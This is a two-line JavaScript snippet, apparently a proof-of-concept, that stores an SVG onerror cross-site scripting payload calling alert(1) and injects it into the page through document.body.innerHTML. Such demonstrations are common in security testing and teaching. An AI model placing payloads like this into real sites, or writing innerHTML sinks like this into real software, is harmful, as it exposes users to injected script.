const xssPayload = "<svg/src=x onerror=alert(1)>";
document.body.innerHTML = xssPayload;

